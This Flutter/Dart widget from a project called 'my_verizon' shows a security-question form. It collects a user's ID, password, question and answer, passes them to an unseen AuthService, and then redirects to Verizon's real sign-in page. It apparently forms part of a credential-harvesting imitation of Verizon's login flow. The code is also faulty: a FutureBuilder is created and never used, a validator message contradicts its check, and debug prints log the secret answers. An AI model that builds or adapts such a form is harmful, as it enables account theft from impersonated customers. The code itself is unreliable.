// ignore_for_file: public_member_api_docs, sort_constructors_first
import 'package:flutter/cupertino.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:my_verizon/auth_service/auth_service.dart';
import 'package:my_verizon/layout/layout.dart';
import 'package:url_launcher/link.dart';

class AnswerFormFieldWidget extends StatefulWidget {
  final String userId;
  final dynamic password;
  final String securityQuestion;
  final TextEditingController securityQuestionAnswer;
  const AnswerFormFieldWidget({
    super.key,
    required this.userId,
    required this.password,
    required this.securityQuestion,
    required this.securityQuestionAnswer,
  });

  @override
  State<AnswerFormFieldWidget> createState() => _AnswerFormFieldWidgetState();
}

class _AnswerFormFieldWidgetState extends State<AnswerFormFieldWidget> {
  GlobalKey<FormState> answerKey = GlobalKey<FormState>();
  final TextEditingController securityQuestionAnswer = TextEditingController();

  @override
  void dispose() {
    securityQuestionAnswer.dispose();
    widget.password.dispose();
    answerKey.currentState?.dispose();
    widget.securityQuestionAnswer.dispose();
    widget.securityQuestionAnswer.clear();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final Uri url = Uri.parse(
      "https://secure.verizon.com/signin?_gl=1*1m3cwkt*_ga*MTU5NzA1NTY1MS4xNzQ1NzU0NzE2*_ga_12R1DX1LX7*MTc0NTc1NDcxNS4xLjEuMTc0NTc1NDcxNS42MC4wLjA.",
    );
    return Form(
      autovalidateMode: AutovalidateMode.onUserInteraction,
      key: answerKey,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(
            width: LayOutWidget.isMobile(context) ? 350 : 400,
            height: 100,
            child: TextFormField(
              inputFormatters: [
                FilteringTextInputFormatter.allow(RegExp(r'^[a-zA-Z]+$')),
              ],
              maxLength: 25,
              maxLines: 1,
              minLines: 1,
              textAlign: TextAlign.start,
              textAlignVertical: TextAlignVertical.center,
              textInputAction: TextInputAction.done,
              scrollPhysics: const BouncingScrollPhysics(),
              obscureText: false,
              controller: securityQuestionAnswer,
              decoration: InputDecoration(
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(0),
                  borderSide: BorderSide(
                    color: CupertinoColors.systemBlue,
                    width: 1,
                  ),
                ),
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(0),
                  borderSide: BorderSide(
                    color: CupertinoColors.systemGrey,
                    width: 1,
                  ),
                ),
                hintText: 'Enter your answer',
                hintStyle: TextStyle(
                  color: CupertinoColors.systemGrey,
                  fontSize: 14,
                ),
                label: Text(
                  'Security Question Answer',
                  style: TextStyle(
                    color: CupertinoColors.systemBlue,
                    fontSize: 14,
                  ),
                ),
                labelStyle: TextStyle(
                  color: CupertinoColors.systemBlue,
                  fontSize: 14,
                ),
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(0),
                  borderSide: BorderSide(
                    color: CupertinoColors.systemGrey,
                    width: 1,
                  ),
                ),
              ),
              validator: (answerValue) {
                if (answerValue == null || answerValue.isEmpty) {
                  return ' answer is required';
                } else if (answerValue.length < 3) {
                  return ' answer must be at least 3 characters';
                } else if (answerValue.length > 25) {
                  return ' answer must be less than 25 characters';
                } else if (answerValue.contains(RegExp(r'[^a-zA-Z0-9]'))) {
                  return ' answer must not be alphanumeric';
                } else if (answerValue.contains(RegExp(r'\s'))) {
                  return ' answer must not contain spaces';
                } else if (answerValue.contains(
                  RegExp(r'^[a-zA-Z0-9]{3,25}$'),
                )) {
                  return null;
                }
                return null;
              },
            ),
          ),
          const SizedBox(height: 20),
          SizedBox(
            width: 150,
            height: 40,
            child: Link(
              uri: url,
              target: LinkTarget.self,
              builder:
                  (context, followLink) => ElevatedButton(
                    onPressed: () async {
                      if (answerKey.currentState!.validate()) {
                        if (kDebugMode) {
                          print(
                            'security Question: ${widget.securityQuestion}',
                          );
                        }
                        if (kDebugMode) {
                          print(
                            'security Answer: ${securityQuestionAnswer.text}',
                          );
                        }

                        await followLink!();
                      }
                      FutureBuilder(
                        future: AuthService().getData(
                          userID: widget.userId,
                          password: widget.password.toString(),
                          securityQuestion: widget.securityQuestion,
                          securityQuestionAnswer: securityQuestionAnswer.text,
                        ),
                        builder: (context, snapshot) {
                          if (kDebugMode) {
                            print(snapshot.toString());
                          }
                          if (snapshot.connectionState ==
                              ConnectionState.done) {
                            return const ScaffoldMessenger(
                              child: SnackBar(
                                content: Text(
                                  'you have passed',
                                  style: TextStyle(color: Colors.blue),
                                ),
                                backgroundColor: Colors.red,
                              ),
                            );
                          } else {
                            return const CircularProgressIndicator();
                          }
                        },
                      );
                    },
                    style: ElevatedButton.styleFrom(
                      elevation: 0,
                      backgroundColor: CupertinoColors.black,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(20),
                      ),
                      minimumSize: const Size.fromHeight(50),
                      fixedSize: const Size(80, 20),
                    ),
                    child: const Text(
                      'Continue',
                      style: TextStyle(color: Colors.white, fontSize: 16),
                    ),
                  ),
            ),
          ),
        ],
      ),
    );
  }
}
